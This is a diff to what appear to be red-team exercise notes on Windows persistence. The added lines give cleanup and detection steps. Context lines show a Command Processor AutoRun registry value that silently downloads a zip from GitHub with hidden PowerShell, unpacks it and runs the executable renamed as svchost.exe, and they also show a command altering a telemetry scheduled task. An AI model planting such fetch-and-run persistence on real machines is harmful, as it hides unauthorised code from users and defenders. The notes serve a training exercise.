@@ -24,6 +24,9 @@ schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Teleme
 AutoRun Registry Key to launch goose with cmd and powershell:
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value 'if exist "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe" (start "" "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe") else (start /b powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri \"https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip\" -OutFile \"$env:TEMP\g.zip\"; Expand-Archive -Path \"$env:TEMP\g.zip\" -DestinationPath \"$env:LOCALAPPDATA\Blueteeth\" -Force; Rename-Item -Path \"$env:LOCALAPPDATA\Blueteeth\GooseTest-main\GooseDesktop.exe\" -NewName \"svchost.exe\"")'
 
+Delete Registry Key:
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun"
+
 Blueteamer can find reg key by checking:
 (Get-ItemProperty "HKLM:\Software\Microsoft\Command Processor").AutoRun
 
